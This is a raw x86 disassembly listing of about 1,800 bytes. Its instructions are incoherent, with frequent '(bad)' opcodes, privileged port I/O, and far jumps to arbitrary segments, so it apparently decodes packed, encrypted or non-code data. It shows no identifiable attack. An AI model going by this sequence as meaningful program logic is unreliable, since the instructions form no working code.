  41ea0e:	cmp    DWORD PTR [ebx],0x27569e96
  41ea14:	xor    al,0xc9
  41ea16:	dec    esp
  41ea17:	xchg   ecx,eax
  41ea18:	inc    edi
  41ea19:	mov    ebp,0x9c4d0adb
  41ea1e:	imul   ecx,DWORD PTR [esp],0x45ffb33e
  41ea25:	pop    edi
  41ea26:	mov    ah,0x82
  41ea28:	inc    edx
  41ea29:	cmp    edi,DWORD PTR [esi+0x7b]
  41ea2c:	jne    0x41e9f5
  41ea2e:	dec    esi
  41ea2f:	shr    edx,1
  41ea31:	out    dx,eax
  41ea32:	lods   al,BYTE PTR ds:[esi]
  41ea33:	xor    bh,BYTE PTR [esi]
  41ea35:	loop   0x41ea6f
  41ea37:	add    ebp,0x6cdd34a3
  41ea3d:	cld    
  41ea3e:	add    eax,0x6287be0
  41ea43:	cmp    al,0xc6
  41ea45:	addr16 int3 
  41ea47:	pop    es
  41ea48:	gs jnp 0x41e9f0
  41ea4b:	and    DWORD PTR [edx],0x321bd5f3
  41ea51:	mov    dh,0x6
  41ea53:	sbb    ah,BYTE PTR [ebx-0x32]
  41ea56:	fcom   DWORD PTR [esi+0xe1fc504]
  41ea5c:	fucom  st(6)
  41ea5e:	scas   al,BYTE PTR es:[edi]
  41ea5f:	pushf  
  41ea60:	mov    ah,0x53
  41ea62:	pop    edi
  41ea63:	scas   eax,DWORD PTR es:[edi]
  41ea64:	(bad)  
  41ea65:	xchg   ecx,eax
  41ea66:	jle    0x41ea2b
  41ea68:	mov    ebx,0xcf0a055c
  41ea6d:	mov    ds:0x6f3ee5e7,eax
  41ea72:	push   cs
  41ea73:	das    
  41ea74:	test   ebp,ebp
  41ea76:	sti    
  41ea77:	sub    DWORD PTR [eax],0xabcfc282
  41ea7d:	(bad)  
  41ea7e:	ret    
  41ea7f:	out    dx,al
  41ea80:	lods   al,BYTE PTR ds:[esi]
  41ea81:	cmp    al,0xf6
  41ea83:	icebp  
  41ea84:	cmp    bh,BYTE PTR [ecx-0x6a]
  41ea87:	and    DWORD PTR [edx+0x1f],0x4c6914b9
  41ea8e:	aad    0x58
  41ea90:	out    0x15,eax
  41ea92:	shr    DWORD PTR [edx+0x3fe4a7bd],cl
  41ea98:	xor    bl,BYTE PTR [edi-0x20]
  41ea9b:	push   DWORD PTR [esi]
  41ea9d:	stos   BYTE PTR es:[edi],al
  41ea9e:	sbb    al,0x96
  41eaa0:	mov    eax,ds:0xba9e2420
  41eaa5:	sub    eax,0xde0d392d
  41eaaa:	mov    bl,0x61
  41eaac:	inc    esi
  41eaad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eaae:	fwait
  41eaaf:	cmp    DWORD PTR [edx],ebp
  41eab1:	add    eax,0xb36bde62
  41eab6:	mov    bh,ch
  41eab8:	inc    eax
  41eab9:	mov    BYTE PTR [edx],dl
  41eabb:	pop    eax
  41eabc:	addr16 pop esi
  41eabe:	fstp   TBYTE PTR [eax+ebp*4]
  41eac1:	loop   0x41ea62
  41eac3:	add    BYTE PTR [ecx],ah
  41eac5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eac6:	imul   edx
  41eac8:	(bad)  
  41eac9:	or     al,0x83
  41eacb:	hlt    
  41eacc:	xor    eax,ebx
  41eace:	cld    
  41eacf:	scas   eax,DWORD PTR es:[edi]
  41ead0:	sbb    ah,cl
  41ead2:	mov    edi,0x6e023245
  41ead7:	xor    eax,0x7e0f4a45
  41eadc:	sbb    eax,0x58127083
  41eae1:	mov    ebx,0xc80516bd
  41eae6:	xchg   edx,eax
  41eae7:	stos   DWORD PTR es:[edi],eax
  41eae8:	jne    0x41eaf9
  41eaea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaeb:	jo     0x41eaa5
  41eaed:	lods   al,BYTE PTR ds:[esi]
  41eaee:	pop    es
  41eaef:	loop   0x41eabd
  41eaf1:	and    DWORD PTR [edi-0x66],0x1
  41eaf5:	xor    BYTE PTR [esi+0x41],ah
  41eaf8:	inc    ebp
  41eaf9:	(bad)  
  41eafa:	popf   
  41eafb:	inc    eax
  41eafc:	push   ebp
  41eafd:	fimul  DWORD PTR [ebx+0x5d8c6d75]
  41eb03:	mov    cl,0xf0
  41eb05:	adc    ebp,DWORD PTR [ebp-0x7b]
  41eb08:	int3   
  41eb09:	jge    0x41eb60
  41eb0b:	pop    esi
  41eb0c:	call   0x7e05:0xb35c947f
  41eb13:	xchg   edi,eax
  41eb14:	pop    ebp
  41eb15:	add    eax,0xc58e275c
  41eb1a:	in     al,0x28
  41eb1c:	sahf   
  41eb1d:	mov    BYTE PTR [eax-0x3cd1c659],bl
  41eb23:	loopne 0x41eb68
  41eb25:	xchg   edx,eax
  41eb26:	mov    ebp,esi
  41eb28:	or     BYTE PTR [ebx+0x10],bl
  41eb2b:	add    BYTE PTR [ebx+0x3bed1d95],ch
  41eb31:	loop   0x41eb1a
  41eb33:	and    eax,0xf90492d4
  41eb38:	jno    0x41eb08
  41eb3a:	mov    bl,0x6c
  41eb3c:	retf   
  41eb3d:	or     al,0x15
  41eb3f:	sub    esp,esi
  41eb41:	mov    cl,0xcf
  41eb43:	rcl    edx,cl
  41eb45:	mov    bh,0x16
  41eb47:	sub    BYTE PTR [eax+eiz*1+0x50f6aa4b],dh
  41eb4e:	ins    DWORD PTR es:[edi],dx
  41eb4f:	aad    0x5d
  41eb51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb52:	and    dl,BYTE PTR [esi]
  41eb54:	inc    esi
  41eb55:	scas   al,BYTE PTR es:[di]
  41eb57:	sar    DWORD PTR [edi-0x2f],cl
  41eb5a:	lds    esp,FWORD PTR [ecx]
  41eb5c:	stc    
  41eb5d:	xor    DWORD PTR [edx],esp
  41eb5f:	mov    bh,0xc8
  41eb61:	or     BYTE PTR [ebx+0x79],bl
  41eb64:	into   
  41eb65:	rol    DWORD PTR [edi+0x7f],cl
  41eb68:	imul   ebp,DWORD PTR [esi-0x38],0x12c7a861
  41eb6f:	in     eax,0x73
  41eb71:	mov    eax,ds:0x313b46f5
  41eb76:	mov    edi,0x1f84c76d
  41eb7b:	xor    eax,0xde5890a3
  41eb80:	or     DWORD PTR [ecx],0xacac4adb
  41eb86:	cmp    al,bh
  41eb88:	xchg   ecx,ecx
  41eb8a:	sahf   
  41eb8b:	jl     0x41ebaf
  41eb8d:	das    
  41eb8e:	arpl   bp,cx
  41eb90:	mov    ah,0xfa
  41eb92:	xor    DWORD PTR [edx+0x485fad08],edi
  41eb98:	mov    eax,ds:0x874bacf1
  41eb9d:	or     eax,0xbceb98c8
  41eba2:	xchg   ecx,eax
  41eba3:	xor    esi,eax
  41eba5:	jnp    0x41ebeb
  41eba7:	adc    ecx,DWORD PTR [eax+0xb]
  41ebaa:	cmp    al,0x90
  41ebac:	shl    BYTE PTR [edx-0x21847a14],0x5
  41ebb3:	fistp  QWORD PTR [ecx]
  41ebb5:	repz test eax,0xb56c2a9e
  41ebbb:	push   0x60
  41ebbd:	out    0xb7,al
  41ebbf:	mov    ds:0x71c5d5d6,al
  41ebc4:	shr    DWORD PTR [eax],cl
  41ebc6:	pop    es
  41ebc7:	xor    BYTE PTR [ecx-0x25946355],dh
  41ebcd:	in     eax,0x6
  41ebcf:	and    ebp,DWORD PTR fs:[edi-0x5fe7281a]
  41ebd6:	xor    edx,DWORD PTR ds:0x78a83653
  41ebdc:	(bad)  
  41ebdd:	dec    ebx
  41ebde:	(bad)  
  41ebdf:	pop    eax
  41ebe0:	int3   
  41ebe1:	rol    BYTE PTR [esi],cl
  41ebe3:	jecxz  0x41ebe5
  41ebe5:	in     eax,dx
  41ebe6:	imul   edi,DWORD PTR [edx-0x5d],0xffffffd7
  41ebea:	jae    0x41ebba
  41ebec:	jmp    0x41ebf4
  41ebee:	xchg   ecx,eax
  41ebef:	sbb    eax,0xf0b7c630
  41ebf4:	adc    al,0x62
  41ebf6:	jns    0x41ebd4
  41ebf8:	adc    al,0xeb
  41ebfa:	mov    al,ds:0xfd10805a
  41ebff:	lea    ebx,[edi+0x559f00dd]
  41ec05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec06:	adc    DWORD PTR [ebp+0x55],esi
  41ec09:	mov    DWORD PTR [ebp+0x47],eax
  41ec0c:	mov    fs,WORD PTR [edx+0x33397b71]
  41ec12:	sbb    al,0x69
  41ec14:	pop    esp
  41ec15:	clc    
  41ec16:	cdq    
  41ec17:	push   edx
  41ec18:	jmp    0x7be5e3d
  41ec1d:	mov    esi,0x3b811e89
  41ec22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec23:	xor    eax,0x1385dec7
  41ec28:	mov    ebp,0xa7866507
  41ec2d:	sti    
  41ec2e:	mov    cl,dl
  41ec30:	mov    edx,0xc02bee94
  41ec35:	sbb    bh,0xec
  41ec38:	test   BYTE PTR [edi],al
  41ec3a:	xadd   al,dh
  41ec3d:	repnz test dh,al
  41ec40:	ret    0x6d8d
  41ec43:	outs   dx,DWORD PTR ds:[esi]
  41ec44:	sub    ecx,DWORD PTR [esi-0x231a7433]
  41ec4a:	jb     0x41ec5c
  41ec4c:	bound  edx,QWORD PTR [eax]
  41ec4e:	push   ebx
  41ec4f:	push   ss
  41ec50:	inc    ecx
  41ec51:	popa   
  41ec52:	test   al,0x3b
  41ec54:	outs   dx,BYTE PTR ds:[esi]
  41ec55:	xchg   edi,eax
  41ec56:	fwait
  41ec57:	mov    eax,ds:0x5cac6f7
  41ec5c:	xchg   DWORD PTR ds:0x87bc3992,esi
  41ec62:	cmp    DWORD PTR [ebx-0x45c89303],0xffffffd5
  41ec69:	xchg   esp,eax
  41ec6a:	test   BYTE PTR [ebx],dh
  41ec6c:	bnd jmp 0x41ecb9
  41ec6f:	mov    esi,0xf7401fc2
  41ec74:	neg    DWORD PTR [eax+ebp*1]
  41ec77:	mov    al,ds:0x2254d2e2
  41ec7c:	mov    edx,0xd22d3ee6
  41ec81:	outs   dx,DWORD PTR ds:[esi]
  41ec82:	sbb    eax,0xeefe586a
  41ec87:	ror    BYTE PTR [ecx],cl
  41ec89:	mov    cl,0x76
  41ec8b:	mov    ch,0x38
  41ec8d:	jg     0x41ec65
  41ec8f:	and    eax,0x5a812258
  41ec94:	ret    0xb228
  41ec97:	fild   QWORD PTR [eax]
  41ec99:	push   esp
  41ec9a:	inc    ebx
  41ec9b:	loopne 0x41ec5c
  41ec9d:	xchg   ecx,eax
  41ec9e:	push   ds
  41ec9f:	push   ss
  41eca0:	jae    0x41ec4b
  41eca2:	mov    edx,0x7216d8b6
  41eca7:	jp     0xffc17b95
  41ecad:	sub    eax,0x6f6e77cc
  41ecb2:	stos   DWORD PTR es:[edi],eax
  41ecb3:	xor    al,0xc4
  41ecb5:	push   es
  41ecb6:	sbb    dl,dl
  41ecb8:	mov    bl,0xb0
  41ecba:	daa    
  41ecbb:	sub    bh,BYTE PTR [esi-0xb291d48]
  41ecc1:	pop    esp
  41ecc2:	or     dh,BYTE PTR [edx+0x350dabea]
  41ecc8:	or     eax,0xba723555
  41eccd:	and    DWORD PTR [edx+eiz*1],esi
  41ecd0:	mov    ecx,eax
  41ecd2:	sub    al,0xce
  41ecd4:	pop    es
  41ecd5:	and    DWORD PTR [eax-0x3122233a],ecx
  41ecdb:	or     al,0x37
  41ecdd:	std    
  41ecde:	aam    0x9d
  41ece0:	inc    ebp
  41ece1:	sub    bh,dh
  41ece3:	cmp    DWORD PTR fs:[esi-0x60],0xffffffa9
  41ece8:	inc    ebp
  41ece9:	and    BYTE PTR [ebp+0x16],dh
  41ecec:	imul   esp,DWORD PTR [edi],0x76530cda
  41ecf2:	test   eax,0xba0c0574
  41ecf7:	je     0x41ec8b
  41ecf9:	ret    0x439a
  41ecfc:	xlat   BYTE PTR ds:[ebx]
  41ecfd:	jecxz  0x41ecec
  41ecff:	mov    BYTE PTR [ebp-0x3b],cl
  41ed02:	adc    DWORD PTR [esp+ebx*8],ebp
  41ed05:	call   0xf1e3:0x88ec161f
  41ed0c:	jecxz  0x41ecec
  41ed0e:	pop    esp
  41ed0f:	ss aam 0x62
  41ed12:	xor    bl,dl
  41ed14:	es cwde 
  41ed16:	pop    ecx
  41ed17:	and    al,0x3a
  41ed19:	push   esp
  41ed1a:	int    0xeb
  41ed1c:	outs   dx,DWORD PTR ds:[esi]
  41ed1d:	mov    edx,0x1d0c21db
  41ed22:	test   al,0xfb
  41ed24:	cmp    al,0x37
  41ed26:	mov    cl,0x59
  41ed28:	mov    ds:0x25cb36c,eax
  41ed2d:	add    al,0xb1
  41ed2f:	je     0x41eda1
  41ed31:	repz xchg ebx,eax
  41ed33:	aam    0x14
  41ed35:	aad    0x45
  41ed37:	mov    eax,ds:0x5e09f470
  41ed3c:	xlat   BYTE PTR ds:[ebx]
  41ed3d:	add    BYTE PTR [edx],dh
  41ed3f:	pop    ecx
  41ed40:	in     al,dx
  41ed41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed42:	sub    DWORD PTR [eax+0x67],edx
  41ed45:	mov    ds:0x5dab5208,al
  41ed4a:	jge    0x41ed88
  41ed4c:	sbb    esi,0xffffff93
  41ed4f:	or     al,0x97
  41ed51:	lods   eax,DWORD PTR ds:[esi]
  41ed52:	or     ebx,ebx
  41ed54:	retf   0xfb67
  41ed57:	mov    al,0xde
  41ed59:	bnd js 0x41ed89
  41ed5c:	add    dh,cl
  41ed5e:	cmp    ah,BYTE PTR ds:0xdc8c41c
  41ed64:	pop    ds
  41ed65:	push   ds
  41ed66:	outs   dx,BYTE PTR ds:[esi]
  41ed67:	cmp    BYTE PTR [esi+0x79],ah
  41ed6a:	or     eax,0x841cce41
  41ed6f:	lahf   
  41ed70:	xlat   BYTE PTR ds:[ebx]
  41ed71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed72:	gs mov ch,0x25
  41ed75:	mov    al,0x26
  41ed77:	in     eax,dx
  41ed78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed79:	into   
  41ed7a:	icebp  
  41ed7b:	and    eax,0x7542fe63
  41ed80:	(bad)  
  41ed82:	js     0x41ed7d
  41ed84:	or     eax,0xcc746057
  41ed89:	outs   dx,BYTE PTR ds:[esi]
  41ed8a:	jno    0x41ed56
  41ed8c:	sti    
  41ed8d:	cmp    ah,BYTE PTR [ecx+0x7bf085fe]
  41ed93:	pop    ss
  41ed94:	push   es
  41ed95:	xchg   edi,eax
  41ed96:	test   DWORD PTR [ebx],ecx
  41ed98:	push   ebx
  41ed99:	scas   eax,DWORD PTR es:[edi]
  41ed9a:	sub    eax,0xc1d1689d
  41ed9f:	xchg   esp,eax
  41eda0:	or     DWORD PTR [eax+ebp*8+0x44cca0d6],0x77fa5379
  41edab:	dec    ebp
  41edac:	mov    cl,0x80
  41edae:	sbb    al,0xe3
  41edb0:	sbb    BYTE PTR [esi-0x7a],dl
  41edb3:	leave  
  41edb4:	sub    eax,DWORD PTR [edi-0x7f]
  41edb7:	pop    ss
  41edb8:	pop    eax
  41edb9:	mov    bl,0x1a
  41edbb:	daa    
  41edbc:	cmp    al,0x8f
  41edbe:	imul   ecx,DWORD PTR [ecx+0x6a],0x90723ece
  41edc5:	ret    
  41edc6:	mov    eax,ds:0x3c63a682
  41edcb:	cdq    
  41edcc:	pop    esp
  41edcd:	mov    ebp,0x56141de2
  41edd2:	ds loopne 0x41ed63
  41edd5:	cmc    
  41edd6:	adc    al,0xa1
  41edd8:	push   ecx
  41edd9:	xchg   ebp,eax
  41edda:	sub    bh,BYTE PTR [edx+esi*1]
  41eddd:	mov    ebx,0xb976d0b6
  41ede2:	inc    esp
  41ede3:	les    ebp,FWORD PTR [ebx]
  41ede5:	xor    ecx,edx
  41ede7:	xor    BYTE PTR [ecx-0x1a964f2c],ah
  41eded:	pusha  
  41edee:	cmp    BYTE PTR [ecx+esi*1+0x11],al
  41edf2:	xor    bl,BYTE PTR [ebp-0x292b5852]
  41edf8:	dec    eax
  41edf9:	or     ecx,DWORD PTR [ebx+0x232884f3]
  41edff:	fsub   QWORD PTR ds:0x454cd7e3
  41ee05:	fistp  WORD PTR [edi]
  41ee07:	aaa    
  41ee08:	mov    ds:0xb3a1090d,al
  41ee0d:	mov    bh,0xc
  41ee0f:	sahf   
  41ee10:	or     esi,DWORD PTR [ebp-0x36]
  41ee13:	lea    eax,[edi-0x96d06ac]
  41ee19:	push   esi
  41ee1a:	xor    dl,BYTE PTR [ebp+ecx*1+0x44]
  41ee1e:	lock jge 0x41ee6b
  41ee21:	repz pushf 
  41ee23:	cdq    
  41ee24:	pop    ecx
  41ee25:	xchg   esi,eax
  41ee26:	arpl   WORD PTR [ebp-0x78],dx
  41ee29:	fwait
  41ee2a:	cmc    
  41ee2b:	mov    al,0xf5
  41ee2d:	sbb    eax,0x58d37eb2
  41ee32:	xor    edx,DWORD PTR [ebp+0x5a]
  41ee35:	call   0xf96eb61d
  41ee3a:	aaa    
  41ee3b:	and    DWORD PTR [esi+0x1e],esp
  41ee3e:	mov    al,ds:0xfedfaa3c
  41ee43:	leave  
  41ee44:	push   eax
  41ee45:	inc    ebp
  41ee46:	and    edx,ebx
  41ee48:	or     edi,DWORD PTR [esp+ecx*4]
  41ee4b:	scas   eax,DWORD PTR es:[edi]
  41ee4c:	sub    ebx,esi
  41ee4e:	pop    eax
  41ee4f:	dec    ebx
  41ee50:	add    esi,DWORD PTR [bp+di-0x22b5]
  41ee55:	mov    ds:0x3a698ea,eax
  41ee5a:	leave  
  41ee5b:	mov    ds:0x238f0b9a,al
  41ee60:	iret   
  41ee61:	addr16 in al,dx
  41ee63:	adc    ebx,DWORD PTR [ebx+0x184f71f5]
  41ee69:	sahf   
  41ee6a:	ja     0x41eee0
  41ee6c:	(bad)  
  41ee6d:	bnd jmp 0x41edf8
  41ee70:	pushf  
  41ee71:	in     eax,0xe1
  41ee73:	ins    BYTE PTR es:[edi],dx
  41ee74:	adc    bl,bl
  41ee76:	(bad)  
  41ee79:	stos   DWORD PTR es:[edi],eax
  41ee7a:	jo     0x41eee3
  41ee7c:	xchg   edi,eax
  41ee7d:	push   es
  41ee7e:	fwait
  41ee7f:	push   esp
  41ee80:	sbb    BYTE PTR [edx-0x24],al
  41ee83:	jl     0x41ee3d
  41ee85:	jecxz  0x41ee38
  41ee87:	je     0x41ee54
  41ee89:	cmp    DWORD PTR [ecx+ebp*1],esp
  41ee8c:	xchg   DWORD PTR [edx-0x68],ebp
  41ee8f:	push   0xffffffcf
  41ee91:	jnp    0x41ef0e
  41ee93:	add    al,0x6e
  41ee95:	mov    ds:0xdd650fc1,al
  41ee9a:	xchg   esi,eax
  41ee9b:	das    
  41ee9c:	cmp    BYTE PTR [edi+0xb],cl
  41ee9f:	jno    0x41eeb5
  41eea1:	js     0x41eeb2
  41eea3:	add    DWORD PTR [edx+0x43],eax
  41eea6:	adc    bh,BYTE PTR [ecx]
  41eea8:	pusha  
  41eea9:	in     eax,0xdb
  41eeab:	arpl   WORD PTR [edi-0x24],di
  41eeae:	sub    DWORD PTR ds:0x138b931,esi
  41eeb4:	xchg   edx,eax
  41eeb5:	fld    QWORD PTR [ebx+0x1]
  41eeb8:	fwait
  41eeb9:	xchg   BYTE PTR [ecx+0x3d1d362d],bh
  41eebf:	int3   
  41eec0:	loopne 0x41eef6
  41eec2:	mov    dl,ch
  41eec4:	cs cli 
  41eec6:	ss mov al,0xa5
  41eec9:	sbb    al,0x55
  41eecb:	test   al,0x4b
  41eecd:	fs jo  0x41eeab
  41eed0:	loopne 0x41eeb9
  41eed2:	push   ecx
  41eed3:	jecxz  0x41eed2
  41eed5:	in     eax,dx
  41eed6:	cld    
  41eed7:	sbb    DWORD PTR ds:0x566d3821,edi
  41eedd:	daa    
  41eede:	dec    edi
  41eedf:	mov    bl,dl
  41eee1:	cs leave 
  41eee3:	int3   
  41eee4:	sbb    eax,esi
  41eee6:	aad    0x5b
  41eee8:	fs (bad) 
  41eeea:	imul   ebx,edx,0x79
  41eeed:	pop    ss
  41eeee:	mov    BYTE PTR [ecx-0xd8c9394],al
  41eef4:	and    BYTE PTR [ebx-0x5016c4b3],dh
  41eefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eefb:	inc    esp
  41eefc:	popf   
  41eefd:	cmp    BYTE PTR ds:0x20a365ca,dl
  41ef03:	lods   eax,DWORD PTR ds:[esi]
  41ef04:	mov    dl,BYTE PTR [eax-0x25]
  41ef07:	sbb    eax,0x146beb2f
  41ef0c:	inc    edi
  41ef0d:	test   DWORD PTR [edx+0x60],edx
  41ef10:	std    
  41ef11:	stos   DWORD PTR es:[edi],eax
  41ef12:	adc    dl,0xa7
  41ef15:	popa   
  41ef16:	cmc    
  41ef17:	fidiv  DWORD PTR [ecx]
  41ef19:	pop    edx
  41ef1a:	in     al,dx
  41ef1b:	sub    BYTE PTR [edx],0x31
  41ef1e:	mov    bh,0x84
  41ef20:	mov    ch,0xac
  41ef22:	and    bh,BYTE PTR [edi-0x7a]
  41ef25:	dec    edx
  41ef26:	pop    ds
  41ef27:	xlat   BYTE PTR ds:[ebx]
  41ef28:	sti    
  41ef29:	xor    BYTE PTR [ebp+0x71],cl
  41ef2c:	das    
  41ef2d:	adc    edi,ebx
  41ef2f:	xor    BYTE PTR ds:0x51739536,ah
  41ef35:	xchg   ebp,eax
  41ef36:	xchg   edi,eax
  41ef37:	xor    BYTE PTR [edi+ebp*8-0x1e],ah
  41ef3b:	and    eax,0x5b102511
  41ef40:	arpl   sp,si
  41ef42:	gs aad 0x7b
  41ef45:	and    DWORD PTR [eax],ebx
  41ef47:	cmp    ebx,0xfffffff9
  41ef4a:	cwde   
  41ef4b:	dec    edi
  41ef4c:	(bad)  
  41ef4d:	or     al,0xc4
  41ef4f:	call   0x347be1
  41ef54:	sub    BYTE PTR [ebx+0x1b],dl
  41ef57:	push   0xffffff9a
  41ef59:	add    ebp,DWORD PTR [ebp-0x63]
  41ef5c:	jae    0x41ef8b
  41ef5e:	fidivr WORD PTR [eax]
  41ef60:	ret    0x94a7
  41ef63:	xchg   BYTE PTR [eax],ah
  41ef65:	(bad)  
  41ef66:	mov    bh,0xf3
  41ef68:	popf   
  41ef69:	bound  eax,QWORD PTR [ecx+0x1b49bb7c]
  41ef6f:	lahf   
  41ef70:	push   ds
  41ef71:	cmp    BYTE PTR [eax],al
  41ef73:	inc    edi
  41ef74:	stc    
  41ef75:	xor    ecx,edi
  41ef77:	or     edx,DWORD PTR [edx+edx*2-0x7c]
  41ef7b:	push   ecx
  41ef7c:	mov    ecx,0xf50362cc
  41ef81:	call   0x1d7e8cd6
  41ef86:	jmp    0x3551:0xa9efb0d5
  41ef8d:	fisttp WORD PTR [eax+0x6]
  41ef90:	popf   
  41ef91:	sub    BYTE PTR ds:0x88bf34d1,al
  41ef97:	jecxz  0x41efbf
  41ef99:	jecxz  0x41ef3d
  41ef9b:	test   edi,edx
  41ef9d:	add    edx,DWORD PTR [ebx+0x24]
  41efa0:	fbstp  TBYTE PTR [ebp+0x33]
  41efa3:	add    BYTE PTR [esi-0x8],al
  41efa6:	and    bh,BYTE PTR [edx+0x364b15d5]
  41efac:	and    BYTE PTR [ebx-0x15],cl
  41efaf:	push   cs
  41efb0:	mov    dh,0xd1
  41efb2:	and    DWORD PTR [eax+edi*4],ebp
  41efb5:	xor    bh,BYTE PTR [ebx+esi*2-0x19f21aa]
  41efbc:	das    
  41efbd:	or     eax,0x47890e9a
  41efc2:	aam    0x68
  41efc4:	inc    eax
  41efc5:	retf   0x7ba
  41efc8:	inc    esp
  41efc9:	add    eax,0xb23efe68
  41efce:	jae    0x41efba
  41efd0:	mov    DWORD PTR [ebx+0x6f],ebx
  41efd3:	mov    eax,0x381e5b97
  41efd8:	dec    esi
  41efd9:	stos   DWORD PTR es:[edi],eax
  41efda:	inc    ebp
  41efdb:	jmp    0x449b:0x43b6a480
  41efe2:	test   ah,ah
  41efe4:	loope  0x41f028
  41efe6:	add    ebp,DWORD PTR [eax]
  41efe8:	daa    
  41efe9:	dec    ebx
  41efea:	cli    
  41efeb:	test   BYTE PTR [esi],al
  41efed:	imul   ebx,DWORD PTR [edx-0x45],0x75246508
  41eff4:	push   ss
  41eff5:	rol    BYTE PTR ds:0xbfefa983,0x78
  41effc:	add    BYTE PTR [esi+0x6ed4f600],dh
  41f002:	dec    ebp
  41f003:	or     bh,BYTE PTR [ebp-0xa8a32c3]
  41f009:	fsub   QWORD PTR [ecx+edi*4]
  41f00c:	xor    DWORD PTR [ebx],ebp
  41f00e:	cmp    al,0x5a
  41f010:	clc    
  41f011:	mov    ds:0xd4eb3e2f,al
  41f016:	aam    0xc8
  41f018:	popa   
  41f019:	cmp    al,0x5c
  41f01b:	dec    ecx
  41f01c:	sub    al,0x4d
  41f01e:	fwait
  41f01f:	leave  
  41f020:	(bad)  
  41f021:	mov    ebp,DWORD PTR [ecx-0x7185023a]
  41f027:	std    
  41f028:	xor    al,0x47
  41f02a:	jo     0x41efb1
  41f02c:	mov    bh,0xe2
  41f02e:	repz loopne 0x41efe5
  41f031:	retf   
  41f032:	and    esi,DWORD PTR ds:0x9b46a70c
  41f038:	xlat   BYTE PTR ds:[bx]
  41f03a:	push   ebp
  41f03b:	mov    cl,0xbe
  41f03d:	rcr    ecx,1
  41f03f:	push   ecx
  41f040:	cwde   
  41f041:	fwait
  41f042:	ret    0x8bb8
  41f045:	mov    ch,0x4c
  41f047:	add    al,bl
  41f049:	sbb    DWORD PTR [edx+0x1d],edi
  41f04c:	fld    DWORD PTR [esi+0x893510e]
  41f052:	fidivr WORD PTR [ebx+0x32]
  41f055:	mov    DWORD PTR [ebx],ecx
  41f057:	outs   dx,BYTE PTR ss:[esi]
  41f059:	test   BYTE PTR [edi],0x64
  41f05c:	add    esi,esi
  41f05e:	fisub  DWORD PTR [ecx-0x4d85317a]
  41f064:	dec    eax
  41f065:	test   al,0x7a
  41f067:	xor    esp,DWORD PTR cs:[ebx-0x62c92c9e]
  41f06e:	cmp    DWORD PTR [esp+eiz*8-0xd],esp
  41f072:	mov    esp,0xaadf5d1e
  41f077:	fwait
  41f078:	mov    edi,0xfe883dfe
  41f07d:	jge    0x41f029
  41f07f:	popf   
  41f080:	sbb    ebp,ebx
  41f082:	fisubr WORD PTR [ecx]
  41f084:	xlat   BYTE PTR ds:[ebx]
  41f085:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f086:	call   0xeed3:0xee5ee3a7
  41f08d:	loop   0x41f0cb
  41f08f:	or     DWORD PTR gs:[ecx+ebp*2+0x3a],esi
  41f094:	les    ebx,FWORD PTR [edx+ebx*8-0x621733fd]
  41f09b:	int    0xb6
  41f09d:	stc    
  41f09e:	and    dl,BYTE PTR [edx-0x15]
  41f0a1:	ret    0xc1cf
  41f0a4:	dec    ebp
  41f0a5:	leave  
  41f0a6:	jno    0x41f092
  41f0a8:	clc    
  41f0a9:	iret   
  41f0aa:	xor    ecx,DWORD PTR [ebx+0x7a77eafc]
  41f0b0:	adc    DWORD PTR [eax+0x1558be0c],esp
  41f0b6:	mov    ecx,0xa13b69e5
  41f0bb:	jg     0x41f0a5
  41f0bd:	and    esp,DWORD PTR [ecx-0xe]
  41f0c0:	jmp    0x1688:0xd4758f23
  41f0c7:	std    
  41f0c8:	fiadd  DWORD PTR [eax+0x7a0c6476]
  41f0ce:	jmp    DWORD PTR [edx+0x5d]
  41f0d1:	lock mov dh,0xd2
  41f0d4:	sbb    DWORD PTR [edi],esi
  41f0d6:	mov    dh,0xbf
  41f0d8:	test   BYTE PTR [ebx+0x3d8f1338],al
  41f0de:	dec    ebp
  41f0df:	in     eax,0x6a
  41f0e1:	ss push es
  41f0e3:	mov    BYTE PTR [ebx+ebx*8],dh
  41f0e6:	pop    edx
  41f0e7:	test   DWORD PTR [ecx-0x7],edi
  41f0ea:	mov    DWORD PTR [esi+ecx*2+0x2],edi
  41f0ee:	fsubr  DWORD PTR ds:0x56322739
  41f0f4:	dec    esp
  41f0f5:	pop    ds
  41f0f6:	cmc    
  41f0f7:	and    BYTE PTR ds:0x61c1738a,cl
  41f0fd:	fiadd  DWORD PTR [ebx-0x17]
  41f100:	dec    esi
  41f101:	jecxz  0x41f096
  41f103:	inc    edi
  41f104:	lods   al,BYTE PTR ds:[esi]
  41f105:	outs   dx,BYTE PTR ds:[esi]
  41f106:	popf   
  41f107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f108:	and    DWORD PTR [edx+0x6c941cf8],esp
  41f10e:	xor    bl,BYTE PTR ds:0xca210072
  41f114:	dec    BYTE PTR [edi]
  41f116:	jp     0x41f179
  41f118:	xchg   ecx,eax
  41f119:	ins    DWORD PTR es:[edi],dx
  41f11a:	test   BYTE PTR [edi+0x3b240272],bh
  41f120:	sbb    bh,dh
  41f122:	les    edi,FWORD PTR [eax+0x66be04f0]
  41f128:	and    BYTE PTR [edx],dl
  41f12a:	into   
  41f12b:	mov    esp,0x4e031ece
  41f130:	jle    0x41f0c1
  41f132:	out    0xdf,al
  41f134:	js     0x41f15c
  41f136:	stc    
  41f137:	(bad)  
  41f139:	ss retf 0x2933
  41f13d:	xor    BYTE PTR [ebp-0x76],cl
  41f140:	pop    esp
  41f141:	arpl   WORD PTR [eax-0x4b],di
  41f144:	mov    ds:0xaf9bc565,eax
  41f149:	ds (bad) 
  41f14b:	jmp    0x41f19f
  41f14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f14e:	repz adc BYTE PTR [edx-0x1389a878],ch
  41f155:	sub    esi,ecx
  41f157:	inc    ecx
  41f158:	ret    
  41f159:	jl     0x41f134
  41f15b:	dec    ebp
  41f15c:	sbb    al,bl
